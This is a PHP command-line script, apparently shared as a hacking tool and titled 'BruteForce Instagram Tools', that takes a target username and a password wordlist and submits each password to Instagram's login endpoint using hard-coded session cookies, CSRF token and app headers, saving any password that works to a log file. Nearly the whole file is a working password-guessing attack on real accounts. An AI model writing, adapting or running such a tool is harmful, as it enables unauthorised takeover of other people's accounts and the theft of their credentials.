<?php 

function showProgressBar($percentage, int $numDecimalPlaces)
{
	$percentageStringLength = 4;
	if ($numDecimalPlaces > 0)
	{
		$percentageStringLength += ($numDecimalPlaces + 1);
	}

	$percentageString = number_format($percentage, $numDecimalPlaces) . '%';
	$percentageString = str_pad($percentageString, $percentageStringLength, " ", STR_PAD_LEFT);

    $percentageStringLength += 3; // add 2 for () and a space before bar starts.

    $terminalWidth = (int) `tput cols`;
    $barWidth = $terminalWidth - ($percentageStringLength) - 2; // subtract 2 for [] around bar
    $numBars = round(($percentage) / 100 * ($barWidth));
    $numEmptyBars = $barWidth - $numBars;

    $barsString = '[' . str_repeat("=", ($numBars)) . str_repeat(" ", ($numEmptyBars)) . ']';

    echo "($percentageString) " . $barsString . "\r";
}


function test($username,$password)
{
	$ch = curl_init();
	echo "$username $password";
	curl_setopt($ch, CURLOPT_URL, "https://www.instagram.com/accounts/login/ajax/");

	date_default_timezone_set('Australia/Melbourne');
	$date = time();
	$payload = "enc_password=%23PWD_INSTAGRAM_BROWSER%3A0%3A1636277221%3A$password&username=$username&queryParams=%7B%7D&optIntoOneTap=false&stopDeletionNonce=&trustedDeviceRecords=%7B%7D";

//attach encoded JSON string to the POST fields
	curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);

	$headers = [
		'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
		'Accept-Language: en-US,en;q=0.5',
		'Accept-Encoding: gzip, deflate',
		'X-CSRFToken: eZP8aOYZ9bZqFM8qMccdvGbN4AkLgMOE',
		'X-Instagram-AJAX: c161aac700f5',
		'X-IG-App-ID: 936619743392459',
		'X-ASBD-ID: 198387',
		'X-IG-WWW-Claim: 0',
		'Content-Type: application/x-www-form-urlencoded',
		'Cookie: csrftoken=eZP8aOYZ9bZqFM8qMccdvGbN4AkLgMOE; mid=YYeMOAALAAFsbm4i_A3pOm0AN4uQ; ig_did=7E2E6768-90AB-40B9-B8A2-08CD1E5985BB; ig_nrcb=1',
		'Content-Length: 178'
	];
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$result = curl_exec($ch);
	curl_close($ch);
	$output = json_decode($result,true);
	if (preg_match("/userId/", $result)) 
	{
		$file = fopen('LogBruteForce.txt', 'a+') or die ("gabisa di buka bosque !");
		$isi  = $username." ".$password;
		fwrite($file, $isi);
		fclose($file); 
		echo "\n\n\nPassword Di Temukan\n\n";
		echo "Username : $username\n";
		echo "Password : $password\n";
		$loop = 2;
	}
}

echo "
_________ _______ _________ _______  _______  _______ 
|\     /|\__   __/(       )\__   __/(  ____ \(  ____ \(  ____ \
| )   ( |   ) (   | () () |   ) (   | (    \/| (    \/| (    \/
| | _ | |   | |   | || || |   | |   | (_____ | (__    | |      
| |( )| |   | |   | |(_)| |   | |   (_____  )|  __)   | |      
| || || |   | |   | |   | |   | |         ) || (      | |      
| () () |___) (___| )   ( |___) (___/\____) || (____/\| (____/\
(_______)\_______/|/     \|\_______/\_______)(_______/(_______/

\n";
echo "BruteForce Instagram Tools\nCreted By MasTenWap\n\n";
echo "Masukan Username Target : ";
$username = trim(fgets(STDIN));
echo "Masukan Wordlist : ";
$wordlist = trim(fgets(STDIN));
$handle = fopen("$wordlist.txt", "rw");
$loop = 1 ;
if ($handle and $loop <= 1) {
	while (($line = fgets($handle)) !== false)
	{
		$total=1000*5;
		for ($i=0; $i<$total; $i++)
		{
			$percentage = $i / $total * 100;
			showProgressBar($percentage, 2);
		}
		print PHP_EOL;
		$pw = trim($line);
		test($username,$pw);
	}

	fclose($handle);
} else {

} 
?>
